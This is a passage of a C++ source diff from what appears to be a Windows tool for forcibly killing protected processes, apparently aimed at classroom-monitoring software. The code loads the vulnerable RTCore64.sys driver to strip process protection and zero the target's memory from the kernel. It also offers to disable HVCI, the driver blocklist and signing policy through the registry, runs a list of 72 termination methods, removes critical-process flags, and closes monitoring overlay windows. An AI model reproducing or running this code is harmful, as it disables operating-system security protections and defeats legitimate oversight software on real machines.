+    //   - 驱动加载失败 -> 静默继续, 后续方法兜底
+    //   - 驱动加载成功 -> 遍历目标 PID 清零 SignatureLevel
+    {
+        std::vector<int> prepPids = getPIDsByName(processName);
+        if (!prepPids.empty()) {
+            std::vector<DWORD> dwordPids;
+            dwordPids.reserve(prepPids.size());
+            for (int p : prepPids) dwordPids.push_back((DWORD)p);
+
+            // 检查可自动关闭的拦截项 (HVCI / DriverBlocklist / WHQLPolicy)
+            //   WDAC 不可自动关闭, 不在询问范围
+            bool hvci, blocklist, whql, wdac;
+            PplDriver::GetBlockStatus(hvci, blocklist, whql, wdac);
+            bool canAutoFix = (hvci || blocklist || whql) && !wdac;
+            bool hasAnyBlock = (hvci || blocklist || whql || wdac);
+
+            // 打印拦截状态
+            if (hasAnyBlock) {
+                std::wcout << L"[预处理] 拦截状态: ";
+                if (hvci)      std::wcout << L"HVCI ";
+                if (blocklist) std::wcout << L"DriverBlocklist ";
+                if (whql)      std::wcout << L"WHQLPolicy ";
+                if (wdac)      std::wcout << L"WDAC(需手动关闭) ";
+                std::wcout << std::endl;
+            }
+
+            // 询问用户是否自动关闭可关闭项 (仅 HVCI/Blocklist/WHQL, 含 WDAC 时不提示)
+            if (canAutoFix) {
+                std::wcout << L"[预处理] 检测到可自动关闭的拦截项 (HVCI/DriverBlocklist/WHQLPolicy)" << std::endl;
+                std::wcout << L"          关闭后需重启才能加载驱动, 是否自动关闭? (y/n): ";
+                wchar_t choice = _getwch();
+                std::wcout << choice << std::endl;
+                if (choice == L'y' || choice == L'Y') {
+                    std::wcout << L"[预处理] 正在关闭拦截项..." << std::endl;
+                    if (hvci)      PplDriver::Hvci::AutoDisable();
+                    if (blocklist) PplDriver::DriverBlocklist::AutoDisable();
+                    if (whql)      PplDriver::DriverPolicy::AutoDisable();
+                    std::wcout << L"[预处理] 已写入注册表, 重启后生效" << std::endl;
+                } else {
+                    std::wcout << L"[预处理] 用户选择不关闭拦截项, 驱动可能无法加载" << std::endl;
+                }
+            } else if (wdac) {
+                std::wcout << L"[预处理] WDAC 已启用且无法自动关闭, 需手动重启到恢复模式关闭" << std::endl;
+            }
+
+            size_t prepRet = PplDriver::DisablePplForPidsBulk(dwordPids);
+            if (prepRet == (size_t)-1) {
+                std::wcout << L"[预处理] 已写入注册表 (HVCI/Blocklist/Policy), 重启后生效" << std::endl;
+            } else if (prepRet > 0) {
+                std::wcout << L"[预处理] 已自动去除 " << prepRet << L" 个目标进程的 PPL" << std::endl;
+            } else {
+                // 0 或其他: 静默, 不影响后续
+            }
+        }
+    }
+
+    // 阻止目标进程访问关键系统进程（方法0，不计入71种方法）
+    std::wcout << L"[方法0] 正在阻止目标进程访问关键系统进程..." << std::endl;
+
+    // 使用统一系统进程白名单
+    std::vector<std::wstring> protectedProcessesW(
+        g_UnifiedSystemProcessWhitelist,
+        g_UnifiedSystemProcessWhitelist + g_WhitelistCount
+    );
+
+    // 获取目标进程的PID
+    std::vector<int> targetPids = getPIDsByName(processName);
+
+    // [v5.2 修复崩溃/卡住] 之前用 detach 导致:
+    //   1. 进程被自己终止时,后台线程访问已销毁的栈变量 → 崩溃
+    //   2. 块作用域变量析构后,后台线程还在跑 → 竞态 + 死循环
+    // 修复: 用 RAII 风格的 std::thread + scoped guard,函数结束前 join
+    if (!targetPids.empty()) {
+        std::atomic<bool> blockThreadRunning(true);
+
+        // [关键] 用 std::unique_ptr 包装 thread,确保函数退出前 join
+        std::thread blockThread([&protectedProcessesW, &blockThreadRunning, targetPids, processName]() {
+            // 创建JOB对象来限制进程
+            HANDLE hJob = CreateJobObject(NULL, NULL);
+            if (hJob) {
+                JOBOBJECT_BASIC_LIMIT_INFORMATION jobLimit = { 0 };
+                jobLimit.LimitFlags = JOB_OBJECT_LIMIT_PROCESS_TIME;
+                jobLimit.PerJobUserTimeLimit.QuadPart = 10000000; // 10秒CPU时间限制
+                SetInformationJobObject(hJob, JobObjectBasicLimitInformation, &jobLimit, sizeof(jobLimit));
+
+                // 将目标进程添加到JOB
+                HANDLE hTarget = OpenProcess(PROCESS_SET_QUOTA | PROCESS_TERMINATE, FALSE, targetPids[0]);
+                if (hTarget) {
+                    AssignProcessToJobObject(hJob, hTarget);
+                    CloseHandle(hTarget);
+                }
+            }
+
+            while (blockThreadRunning.load(std::memory_order_relaxed)) {
+                // [关键] 检查目标进程是否还存在,避免在已终止进程上浪费时间
+                HANDLE hTarget = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPids[0]);
+                if (!hTarget || hTarget == INVALID_HANDLE_VALUE) {
+                    // 目标进程已终止或无权限,退出循环
+                    break;
+                }
+
+                // 检查目标进程是否就是自己(防止自杀后无法继续)
+                if (GetProcessId(hTarget) == GetCurrentProcessId()) {
+                    CloseHandle(hTarget);
+                    break;
+                }
+
+                // 遍历所有受保护的进程
+                for (const auto& protectedProcess : protectedProcessesW) {
+                    // 获取受保护进程的PID (wstring -> string 转换)
+                    std::string processNameA(protectedProcess.begin(), protectedProcess.end());
+                    std::vector<int> protectedPids = getPIDsByName(processNameA);
+                    for (int protectedPid : protectedPids) {
+                        if (protectedPid > 0) {
+                            // 尝试关闭指向受保护进程的句柄
+                            typedef NTSTATUS (NTAPI* _NtDuplicateObject)(
+                                HANDLE SourceProcessHandle,
+                                HANDLE SourceHandle,
+                                HANDLE TargetProcessHandle,
+                                PHANDLE TargetHandle,
+                                ACCESS_MASK DesiredAccess,
+                                ULONG HandleAttributes,
+                                ULONG Options);
+
+                            HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
+                            if (hNtdll) {
+                                _NtDuplicateObject pNtDuplicateObject = (_NtDuplicateObject)GetProcAddress(hNtdll, "NtDuplicateObject");
+                                if (pNtDuplicateObject) {
+                                    HANDLE hDuplicated = nullptr;
+                                    pNtDuplicateObject(hTarget, reinterpret_cast<HANDLE>(static_cast<uintptr_t>(-1)), GetCurrentProcess(), &hDuplicated, 0, 0, 0x1);
+                                }
+                            }
+                        }
+                    }
+                }
+
+                // 方法2: 尝试将目标进程添加到受保护的JOB
+                if (hJob) {
+                    BOOL inJob = FALSE;
+                    if (IsProcessInJob(hTarget, hJob, &inJob) && !inJob) {
+                        AssignProcessToJobObject(hJob, hTarget);
+                    }
+                }
+
+                // 方法3: 尝试修改目标进程的优先级
+                SetPriorityClass(hTarget, IDLE_PRIORITY_CLASS);
+                SetProcessPriorityBoost(hTarget, TRUE);
+
+                // 方法4: 尝试挂起目标进程的所有线程
+                HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, targetPids[0]);
+                if (hSnap != INVALID_HANDLE_VALUE) {
+                    THREADENTRY32 te = { 0 };
+                    te.dwSize = sizeof(te);
+                    while (Thread32Next(hSnap, &te)) {
+                        if (te.th32OwnerProcessID == (DWORD)targetPids[0]) {
+                            HANDLE hThread = OpenThread(THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID);
+                            if (hThread) {
+                                SuspendThread(hThread);
+                                CloseHandle(hThread);
+                            }
+                        }
+                    }
+                    CloseHandle(hSnap);
+                }
+
+                // 方法5: 尝试关闭目标进程
+                TerminateProcess(hTarget, 0);
+                CloseHandle(hTarget);
+
+                // 方法6: 使用系统命令尝试终止进程
+                system(("taskkill /F /PID " + std::to_string(targetPids[0]) + " >nul 2>&1").c_str());
+            }
+
+            // 清理JOB对象
+            if (hJob) {
+                TerminateJobObject(hJob, 0);
+                CloseHandle(hJob);
+            }
+        });
+
+        // [关键] 使用 RAII guard 确保函数退出前 join 后台线程
+        struct ThreadJoiner {
+            std::thread& t;
+            std::atomic<bool>& flag;
+            ~ThreadJoiner() {
+                // 1. 设置停止标志,通知后台线程退出
+                flag.store(false, std::memory_order_release);
+                // 2. 等待后台线程结束(join)
+                if (t.joinable()) {
+                    t.join();
+                }
+            }
+        };
+        ThreadJoiner joiner{blockThread, blockThreadRunning};
+
+        // 注意: joiner 会在本作用域结束时自动 join 后台线程
+        // (在 return 之前调用析构函数)
+    }
+
+    // ============= [方法 1] 基于驱动的 VAD 内存扫描与删除 (前置操作完成后立即执行) =============
+    //   前置: PPL 已去除 (方法 0 已阻止目标访问关键进程) + 驱动已加载
+    //   目标: 通过 RTCore64.sys 读 EPROCESS.VadRoot 遍历 VAD 树, 精确定位
+    //         目标进程所有已分配的用户态内存区域, 在合法 VAD 范围内清零
+    //   适用: 目标进程有自保护逻辑, 常规方法被杀会重启; 此时通过驱动读 VAD
+    //         找到保护代码所在区域并清零, 强制失效
+    //   位置: 作为第 1 种方法 (前置操作完成后), 原 71 种方法顺延为 2-72
+    //
+    //   [DMSP v5.3 校验植入] 此方法涉及驱动加载/内核读写, 是高敏感操作:
+    //     - 方法 1 块开始: DMSP_VERIFY(0x2010) 二级验证, 失败时通过 TriggerResponse 报告
+    //     - 每个 PID 调用前: DMSP_VERIFY(0x2011) 三级验证, 防止补丁注入绕过签名
+    //     - 校验失败: 不执行 VAD 清零, 直接走 71 种方法链
+    // ----------------------------------------------------------------------------
+    {
+        // [DMSP v5.3] 二级签名验证 - 驱动 VAD 内存清零子函数
+        //   校验失败 -> 跳过方法 1, 走 71 种方法链兜底
+        if (DMSP::g_state.initialized) {
+            if (!UnifiedValidator::PerformQuickVerification(0x2010)) {
+                // 校验失败, 不执行 VAD 清零
+            } else {
+                std::vector<int> driverPids = getPIDsByName(processName);
+                if (!driverPids.empty()) {
+                    std::wcout << L"[方法1] 基于驱动扫描 VAD 树并清零内存区域..." << std::endl;
+                    int totalErased = 0;
+                    for (int pid : driverPids) {
+                        // [DMSP v5.3] 三级签名验证 - 每次 VAD 清零前
+                        //   校验 ppl_driver.h 中关键函数体 CRC, 防止攻击者 hook ScanAndEraseVadMemory
+                        if (DMSP::g_state.initialized) {
+                            auto _dmsp_vad_verify = UnifiedValidator::PerformFullValidation(false);
+                            if (!_dmsp_vad_verify.passed) {
+                                continue;
+                            }
+                        }
+
+                        PplDriver::ScanAndEraseVadMemory((DWORD)pid, totalErased);
+                    }
+                    if (totalErased > 0) {
+                        std::wcout << L"[方法1] 已清零 " << totalErased << L" 个 VAD 区域" << std::endl;
+                    } else {
+                        std::wcout << L"[方法1] VAD 扫描未发现可清零区域" << std::endl;
+                    }
+                }
+            }
+        } else {
+            // DMSP 未初始化, 跳过校验, 直接执行
+            std::vector<int> driverPids = getPIDsByName(processName);
+            if (!driverPids.empty()) {
+                std::wcout << L"[方法1] 基于驱动扫描 VAD 树并清零内存区域..." << std::endl;
+                int totalErased = 0;
+                for (int pid : driverPids) {
+                    PplDriver::ScanAndEraseVadMemory((DWORD)pid, totalErased);
+                }
+                if (totalErased > 0) {
+                    std::wcout << L"[方法1] 已清零 " << totalErased << L" 个 VAD 区域" << std::endl;
+                } else {
+                    std::wcout << L"[方法1] VAD 扫描未发现可清零区域" << std::endl;
+                }
+            }
+        }
+    }
+
+    // 定义方法列表
+    typedef bool (*TerminateMethod)(const std::string&);
+    TerminateMethod methods[] = {
+        terminateByProcessName,
+        terminateByDirectMemoryZeroing,
+        terminateByServiceDetection,
+        terminateByPPLBypass,
+        terminateBySystemCommand,
+        terminateByPhantomKiller,
+        terminateByParentChildRelationship,
+        terminateByProcessIsolationAndBlocking,
+        terminateByWindowHandle,
+        terminateByDebugging,
+        terminateByPriorityManipulation,
+        terminateByNativeAPI,
+        terminateByHandleEnumeration,
+        terminateByMemoryPatching,
+        terminateByProcessIsolationAndAPIDisruption,
+        terminateByKernelMemoryManipulation,
+        terminateByObCallbacks,
+        terminateByProcessObjectManipulation,
+        terminateBySecurityDescriptorModification,
+        terminateByWMI,
+        terminateByAdvancedIsolation,
+        terminateByCriticalProcessFlag,
+        terminateByMemoryCorruption,
+        terminateByHandleCloning,
+        terminateByDesktopIsolation,
+        terminateByTokenPrivilegeRemoval,
+        terminateByRegistryModification,
+        terminateByServiceControl,
+        terminateByCOMObjectManipulation,
+        terminateByNetworkIsolation,
+        terminateByPowerManagement,
+        terminateByUIAutomation,
+        terminateByRandomizedMethods,
+        terminateByThreadSuspension,
+        terminateByProcessDebugPort,
+        terminateByProcessHandleTable,
+        terminateByProcessWorkingSet,
+        terminateByProcessPagePriority,
+        terminateByProcessIoPriority,
+        terminateByProcessCycleTime,
+        terminateByProcessCookie,
+        terminateByImageSignatureEnforcement,
+        terminateByCodeIntegrityViolation,
+        terminateByExtendedPolicyFramework,
+        terminateByMemoryPartitionCorruption,
+        terminateByThreadPoolInfrastructure,
+        terminateByExceptionChainCorruption,
+        terminateBySecuritySubsystemBypass,
+        terminateByVirtualizationInfrastructure,
+        terminateByProcessDepletion,
+        terminateByProcessAttach,
+        terminateByProcessDetach,
+        terminateByProcessFault,
+        terminateByProcessInterlock,
+        terminateByHandleInheritance,
+        terminateByMemoryZeroing,
+        terminateByThreadHijacking,
+        terminateByExceptionInjection,
+        terminateByMessageFlooding,
+        terminateByProcessTree,
+        terminateByTokenReplacement,
+        terminateByAPCInjection,
+        terminateByProcessVault,
+        terminateByProcessDynamicCodePolicy,
+        terminateByProcessControlFlowGuard,
+        terminateByProcessSignaturePolicy,
+        terminateByProcessEnergyManagement,
+        terminateByProcessStateExtension,
+        terminateByProcessFaultTolerance,
+        terminateByProcessActivityModeration,
+        terminateByProcessVirtualizationBasedSecurity,
+        terminateByTaskManagerMethod,
+        terminateByProcessIsolation,
+        terminateByPracticalRing0Call
+    };
+
+    int methodCount = sizeof(methods) / sizeof(methods[0]);
+
+    std::cout << "尝试使用 " << methodCount << " 种方法终止进程: " << processName << std::endl;
+
+    bool processWasRunning = isProcessRunning(processName);
+        for (int i = 0; i < methodCount; i++) {
+            // 方法23、47、59、72 重试不同次数 (又插入PhantomKiller id 1)
+            int retryCount = 2;
+            if (i == 58) {
+                retryCount = 8;
+            } else if (i == 22 || i == 46 || i == 71) {
+                retryCount = 4;
+            } else if (i == methodCount - 1) {
+                retryCount = 1;
+            }
+            
+            for (int retry = 0; retry < retryCount; retry++) {
+                try {
+                    if (retryCount > 1) {
+                        RemoveCriticalProcessFlag(processName);
+                    }
+
+                    // 仅每方法的第一轮打印进度
+                    if (retry == 0)
+                        std::cout << "方法 " << (i + 1) << "/" << methodCount
+                                  << (retryCount > 1 ? " (重试)" : "") << "..." << std::endl;
+
+                    methods[i](processName);
+
+                    // 检查进程是否已终止
+                    if (!isProcessRunning(processName)) {
+                        std::cout << "方法 " << (i + 1) << " 成功终止进程!" << std::endl;
+                        return true;
+                    }
+                }
+                catch (const std::exception& e) {
+                    std::cerr << "方法 " << (i + 1) << " 执行出错: " << e.what() << std::endl;
+                }
+                catch (...) {
+                    std::cerr << "方法 " << (i + 1) << " 执行出错: 未知错误" << std::endl;
+                }
+            }
+        }
+
+    // 最终检查进程状态
+    bool processStillRunning = isProcessRunning(processName);
+
+    if (processWasRunning && !processStillRunning) {
+        std::cout << "进程已成功终止!" << std::endl;
+        return true;
+    }
+    else if (!processWasRunning) {
+        std::cout << "进程原本就不在运行状态!" << std::endl;
+        return true;
+    }
+    else {
+        std::cout << "所有方法都无法终止进程。" << std::endl;
+        return false;
+    }
+}
+void RemoveCriticalProcessFlags(const std::vector<std::string>& processNames)
+{
+    // 获取系统进程快照
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnapshot == INVALID_HANDLE_VALUE)
+    {
+        std::wcerr << L"无法创建进程快照" << std::endl;
+        return;
+    }
+
+    PROCESSENTRY32 pe32;
+    pe32.dwSize = sizeof(PROCESSENTRY32);
+
+    // 遍历所有进程
+    if (Process32First(hSnapshot, &pe32))
+    {
+        do
+        {
+            // 将宽字符进程名转换为多字节字符串
+            char processName[MAX_PATH];
+            WideCharToMultiByte(CP_UTF8, 0, pe32.szExeFile, -1,
+                processName, MAX_PATH, NULL, NULL);
+
+            // 检查是否在目标进程列表中
+            for (const auto& targetName : processNames)
+            {
+                if (targetName == processName)
+                {
+                    // 找到匹配进程，尝试移除关键标识
+                    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
+                    if (hProcess != nullptr)
+                    {
+                        // 使用NtSetInformationProcess移除关键标识
+                        typedef NTSTATUS(NTAPI* pNtSetInformationProcess)(
+                            HANDLE ProcessHandle,
+                            ULONG ProcessInformationClass,
+                            PVOID ProcessInformation,
+                            ULONG ProcessInformationLength);
+
+                        HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
+                        if (hNtdll)
+                        {
+                            pNtSetInformationProcess NtSetInformationProcess =
+                                reinterpret_cast<pNtSetInformationProcess>(
+                                    GetProcAddress(hNtdll, "NtSetInformationProcess"));
+
+                            if (NtSetInformationProcess)
+                            {
+                                DWORD breakOnTermination = 0;
+                                NTSTATUS status = NtSetInformationProcess(
+                                    hProcess,
+                                    29, // ProcessBreakOnTermination
+                                    &breakOnTermination,
+                                    sizeof(breakOnTermination));
+
+                                // 可选：记录操作结果
+                                if (NT_SUCCESS(status))
+                                {
+                                    std::wcout << L"成功移除进程 " << pe32.szExeFile
+                                        << L" (PID: " << pe32.th32ProcessID
+                                        << L") 的关键标识" << std::endl;
+                                }
+                            }
+                        }
+
+                        CloseHandle(hProcess);
+                    }
+                    break; // 跳出内层循环，继续查找下一个进程
+                }
+            }
+        } while (Process32Next(hSnapshot, &pe32));
+    }
+
+    CloseHandle(hSnapshot);
+}
+// 多进程终止方法
+bool ProcessTerminator::terminateMultipleProcesses(const std::vector<std::string>& processNames) {
+    GQS(processNames);
+    RemoveCriticalProcessFlags(processNames);
+    if (processNames.empty()) {
+        std::cout << "没有提供进程名!" << std::endl;
+        return false;
+    }
+
+    std::cout << "开始终止 " << processNames.size() << " 个进程..." << std::endl;
+
+    bool allTerminated = true;
+    std::vector<std::thread> threads;
+    std::vector<bool> results(processNames.size(), false);
+
+    // 使用多线程同时终止多个进程
+    for (size_t i = 0; i < processNames.size(); ++i) {
+        threads.emplace_back([i, &processNames, &results]() {
+            try {
+                std::cout << "开始终止进程: " << processNames[i] << std::endl;
+                results[i] = terminateByAllMethods(processNames[i]);
+            }
+            catch (const std::exception& e) {
+                std::cerr << "终止进程 " << processNames[i] << " 时出错: " << e.what() << std::endl;
+                results[i] = false;
+            }
+            catch (...) {
+                std::cerr << "终止进程 " << processNames[i] << " 时出错: 未知错误" << std::endl;
+                results[i] = false;
+            }
+            });
+    }
+
+    // 等待所有线程完成
+    for (auto& thread : threads) {
+        thread.join();
+    }
+
+    // 检查结果
+    for (size_t i = 0; i < processNames.size(); ++i) {
+        if (!results[i]) {
+            std::cout << "进程 " << processNames[i] << " 终止失败!" << std::endl;
+            allTerminated = false;
+        }
+        else {
+            std::cout << "进程 " << processNames[i] << " 终止成功!" << std::endl;
+        }
+    }
+
+    return allTerminated;
+}
+
+// 验证文件是否有微软数字签名
+bool ProcessTerminator::IsMicrosoftSigned(const std::wstring& filePath) {
+    if (filePath.empty()) return false;
+    
+    // 检查文件是否存在
+    DWORD attribs = GetFileAttributesW(filePath.c_str());
+    if (attribs == INVALID_FILE_ATTRIBUTES) return false;
+    
+    WINTRUST_FILE_INFO fileInfo = { 0 };
+    fileInfo.cbStruct = sizeof(WINTRUST_FILE_INFO);
+    fileInfo.pcwszFilePath = filePath.c_str();
+    fileInfo.hFile = NULL;
+    fileInfo.pgKnownSubject = NULL;
+
+    GUID actionGuid = WINTRUST_ACTION_GENERIC_VERIFY_V2;
+    
+    WINTRUST_DATA winTrustData = { 0 };
+    winTrustData.cbStruct = sizeof(WINTRUST_DATA);
+    winTrustData.pPolicyCallbackData = NULL;
+    winTrustData.pSIPClientData = NULL;
+    winTrustData.dwUIChoice = WTD_UI_NONE;
+    winTrustData.fdwRevocationChecks = WTD_REVOKE_NONE;
+    winTrustData.dwUnionChoice = WTD_CHOICE_FILE;
+    winTrustData.pFile = &fileInfo;
+    winTrustData.dwStateAction = WTD_STATEACTION_VERIFY;
+    winTrustData.hWVTStateData = NULL;
+    winTrustData.pwszURLReference = NULL;
+    winTrustData.dwProvFlags = WTD_CACHE_ONLY_URL_RETRIEVAL;
+    winTrustData.dwUIContext = 0;
+
+    LONG status = WinVerifyTrust(NULL, &actionGuid, &winTrustData);
+    
+    bool isMicrosoftSigned = false;
+    
+    if (status == ERROR_SUCCESS) {
+        CRYPT_PROVIDER_DATA* pProvData = WTHelperProvDataFromStateData(winTrustData.hWVTStateData);
+        if (pProvData) {
+            CRYPT_PROVIDER_SGNR* pProvSigner = WTHelperGetProvSignerFromChain(pProvData, 0, FALSE, 0);
+            if (pProvSigner) {
+                CRYPT_PROVIDER_CERT* pProvCert = WTHelperGetProvCertFromChain(pProvSigner, 0);
+                if (pProvCert && pProvCert->pCert) {
+                    wchar_t szSubjectName[256] = { 0 };
+                    DWORD dwSubjectNameSize = sizeof(szSubjectName);
+                    
+                    if (CertGetNameStringW(pProvCert->pCert, CERT_NAME_SIMPLE_DISPLAY_TYPE,
+                        0, NULL, szSubjectName, dwSubjectNameSize) > 0) {
+                        std::wstring subjectName = szSubjectName;
+                        std::transform(subjectName.begin(), subjectName.end(), subjectName.begin(), ::towlower);
+                        
+                        if (subjectName.find(L"microsoft") != std::wstring::npos) {
+                            isMicrosoftSigned = true;
+                        }
+                    }
+                }
+            }
+        }
+    }
+    
+    // 清理
+    winTrustData.dwStateAction = WTD_STATEACTION_CLOSE;
+    WinVerifyTrust(NULL, &actionGuid, &winTrustData);
+    
+    return isMicrosoftSigned;
+}
+
+// 独立函数实现（在ProcessTerminator类方法之后）
+bool ForceSetForegroundWindow(HWND hwnd);
+
+bool RestoreUSBStorageDevices() {
+    return ProcessTerminator::RestoreUSBStorage();
+}
+
+bool RestoreInputDevices() {
+    return ProcessTerminator::RestoreInputDevices();
+}
+
+bool RemoveFullscreenOverlays() {
+    return ProcessTerminator::DetectAndRemoveFullscreenOverlays();
+}
+
+// 最小化覆盖窗口（用于黑屏肃静状态下显示程序窗口）
+void MinimizeOverlayWindows() {
+    // 检测可疑窗口并移除
+    EnumWindows([](HWND hwnd, LPARAM) -> BOOL {
+        if (!hwnd || !IsWindow(hwnd)) return TRUE;
+        
+        DWORD pid;
+        GetWindowThreadProcessId(hwnd, &pid);
+        if (pid == GetCurrentProcessId()) return TRUE;
+        
+        wchar_t className[256] = {};
+        wchar_t windowTitle[256] = {};
+        
+        GetClassNameW(hwnd, className, 256);
+        GetWindowTextW(hwnd, windowTitle, 256);
+        
+        LONG exStyle = GetWindowLongW(hwnd, GWL_EXSTYLE);
+        LONG style = GetWindowLongW(hwnd, GWL_STYLE);
+        
+        RECT rect;
+        if (!GetWindowRect(hwnd, &rect)) return TRUE;
+        
+        int winW = rect.right - rect.left;
+        int winH = rect.bottom - rect.top;
+        int screenW = GetSystemMetrics(SM_CXSCREEN);
+        int screenH = GetSystemMetrics(SM_CYSCREEN);
+        
+        // 检测窗口尺寸（小窗口策略）
+        bool isSmallWindow = (winW >= 50 && winW <= 200 && winH >= 20 && winH <= 150);
+        bool isMediumWindow = (winW >= 80 && winW <= 200 && winH >= 30 && winH <= 100);
+        bool isFullscreen = (winW >= screenW * 0.95f && winH >= screenH * 0.95f);
+        bool isLargeWindow = (winW >= screenW * 0.5f && winH >= screenH * 0.5f);
+        
+        // 检测窗口位置（左上角区域，适合多个小窗口布局）
+        bool isTopLeftArea = (rect.left >= 0 && rect.left <= 500 && rect.top >= 0 && rect.top <= 300);
+        
+        // 检测可疑类名（直接）
+        bool suspiciousClassDirect = wcsstr(className, L"DXGI") != nullptr ||
+                             wcsstr(className, L"D3D") != nullptr ||
+                             wcsstr(className, L"Overlay") != nullptr ||
+                             wcsstr(className, L"Hook") != nullptr ||
+                             wcsstr(className, L"Monitor") != nullptr ||
+                             wcsstr(className, L"Control") != nullptr ||
+                             wcsstr(className, L"Education") != nullptr ||
+                             wcsstr(className, L"ApplicationFrame") != nullptr ||
+                             wcsstr(className, L"Windows.UI.Core") != nullptr ||
+                             wcsstr(className, L"WorkerW") != nullptr ||
+                             wcsstr(className, L"Progman") != nullptr ||
+                             wcsstr(className, L"Shell_TrayWnd") != nullptr;
+        
+        // 检测explorer窗口（用于小窗口策略）
+        bool isExplorerClass = wcsstr(className, L"CabinetWClass") != nullptr ||
+                             wcsstr(className, L"ExploreWClass") != nullptr ||
+                             wcsstr(className, L"Internet Explorer") != nullptr ||
+                             wcsstr(className, L"IEFrame") != nullptr ||
+                             wcsstr(className, L"Frame Window") != nullptr ||
+                             wcsstr(className, L"ShellTabWindowClass") != nullptr ||
+                             wcsstr(className, L"CommandTargetClass") != nullptr ||
+                             wcsstr(className, L"ReBarWindow32") != nullptr ||
+                             wcsstr(className, L"AddressBandRoot") != nullptr ||
+                             wcsstr(className, L"DirectUIHWND") != nullptr ||
+                             wcsstr(className, L"DUIListView") != nullptr ||
+                             wcsstr(className, L"SysTreeView32") != nullptr ||
+                             wcsstr(className, L"SysListView32") != nullptr;
+        
+        // 检测Button类（可能是白色小窗口）
+        bool isButtonClass = wcsstr(className, L"Button") != nullptr ||
+                           wcsstr(className, L"Static") != nullptr;
+        
+        // 检测Windows默认窗口类
+        bool isDefaultClass = wcsstr(className, L"#") != nullptr;
+        
+        // 检测可疑类名（变体）
+        bool suspiciousClassVariant = wcsstr(className, L"Class") != nullptr ||
+                             wcsstr(className, L"Room") != nullptr ||
+                             wcsstr(className, L"Screen") != nullptr ||
+                             wcsstr(className, L"Client") != nullptr ||
+                             wcsstr(className, L"Server") != nullptr ||
+                             wcsstr(className, L"Desk") != nullptr;
+        
+        // 检测可疑标题（直接）
+        bool suspiciousTitleDirect = wcsstr(windowTitle, L"教室") != nullptr ||
+                            wcsstr(windowTitle, L"监控") != nullptr ||
+                            wcsstr(windowTitle, L"控制") != nullptr ||
+                            wcsstr(windowTitle, L"锁定") != nullptr ||
+                            wcsstr(windowTitle, L"肃静") != nullptr ||
+                            wcsstr(windowTitle, L"黑屏") != nullptr ||
+                            wcsstr(windowTitle, L"屏幕广播") != nullptr ||
+                            wcsstr(windowTitle, L"电子教室") != nullptr;
+        
+        // 检测可疑标题（变体）
+        bool suspiciousTitleVariant = wcsstr(windowTitle, L"课堂") != nullptr ||
+                            wcsstr(windowTitle, L"教学") != nullptr ||
+                            wcsstr(windowTitle, L"演示") != nullptr ||
+                            wcsstr(windowTitle, L"投屏") != nullptr ||
+                            wcsstr(windowTitle, L"互动") != nullptr ||
+                            wcsstr(windowTitle, L"学习") != nullptr ||
+                            wcsstr(windowTitle, L"考试") != nullptr ||
+                            wcsstr(windowTitle, L"答题") != nullptr;
+        
+        // 检测无标题或特殊标题
+        bool noTitle = (windowTitle[0] == L'\0' || windowTitle[0] == L' ');
+        
+        bool isLayered = (exStyle & WS_EX_LAYERED) != 0;
+        bool isTopmost = (exStyle & WS_EX_TOPMOST) != 0;
+        bool isTransparent = (exStyle & WS_EX_TRANSPARENT) != 0;
+        bool isToolWindow = (exStyle & WS_EX_TOOLWINDOW) != 0;
+        bool isNoActivate = (exStyle & WS_EX_NOACTIVATE) != 0;
+        
+        // 检测条件
+        bool shouldRemove = false;
+        
+        // 条件1：全屏 + 可疑类名（直接）
+        if (isFullscreen && suspiciousClassDirect) shouldRemove = true;
+        
+        // 条件2：全屏 + 可疑标题
+        if (isFullscreen && (suspiciousTitleDirect || suspiciousTitleVariant)) shouldRemove = true;
+        
+        // 条件3：置顶 + 分层 + 可疑标题
+        if (isTopmost && isLayered && (suspiciousTitleDirect || suspiciousTitleVariant)) shouldRemove = true;
+        
+        // 条件4：透明 + 全屏 + 可疑变体
+        if (isTransparent && isFullscreen && suspiciousClassVariant) shouldRemove = true;
+        
+        // 条件5：纯黑/纯色窗口（全屏无边框）
+        if (isFullscreen && (style & WS_POPUP) != 0 && 
+            (style & WS_CAPTION) == 0 && 
+            (style & WS_BORDER) == 0 &&
+            (suspiciousTitleDirect || suspiciousTitleVariant || suspiciousClassDirect || suspiciousClassVariant)) {
+            shouldRemove = true;
+        }
+        
+        // 条件6：无边框无标题的全屏弹出窗口
+        if (isFullscreen && (style & WS_POPUP) != 0 && 
+            (style & WS_CAPTION) == 0 && 
+            (style & WS_BORDER) == 0 &&
+            noTitle) {
+            shouldRemove = true;
+        }
+        
+        // 条件7：左上角的可疑大窗口（Runtime Broker伪装）
+        if (isTopLeftArea && isLargeWindow && noTitle && 
+            (suspiciousClassDirect || suspiciousClassVariant || isLayered || isTopmost)) {
+            shouldRemove = true;
+        }
+        
+        // 条件8：纯白/浅色背景可疑窗口
+        if (isLargeWindow && noTitle &&
+            (suspiciousClassDirect || suspiciousClassVariant || isLayered || isToolWindow)) {
+            shouldRemove = true;
+        }
+        
+        // 条件9：置顶的无标题大窗口
+        if (isTopmost && isLargeWindow && noTitle && 
+            (isLayered || isTransparent || isNoActivate)) {
+            shouldRemove = true;
+        }
+        
+        // 条件10：检测纯黑壁纸覆盖（非常大的无标题窗口）
+        if (winW >= screenW * 0.8f && winH >= screenH * 0.8f && 
+            (style & WS_POPUP) != 0 &&
+            (noTitle || suspiciousClassDirect || suspiciousClassVariant)) {
+            shouldRemove = true;
+        }
+        
+        // 条件11：多个小白色窗口策略（100x40像素左右的窗口）
+        // 如果是小窗口 + 可疑类名(Runtime Broker/Explorer) + 无标题 + 置顶
+        if (isSmallWindow && noTitle && isTopmost && 
+            (suspiciousClassDirect || isExplorerClass || isButtonClass || suspiciousClassVariant)) {
+            shouldRemove = true;
+        }
+        
+        // 条件12：中等尺寸窗口（可能是多个小窗口合并）
+        if (isMediumWindow && noTitle && (isTopmost || isLayered) &&
+            (suspiciousClassDirect || isExplorerClass)) {
+            shouldRemove = true;
+        }
+        
+        // 条件13：小窗口在屏幕左上区域密集排列（多个小窗口策略）
+        if (isSmallWindow && noTitle && isTopLeftArea &&
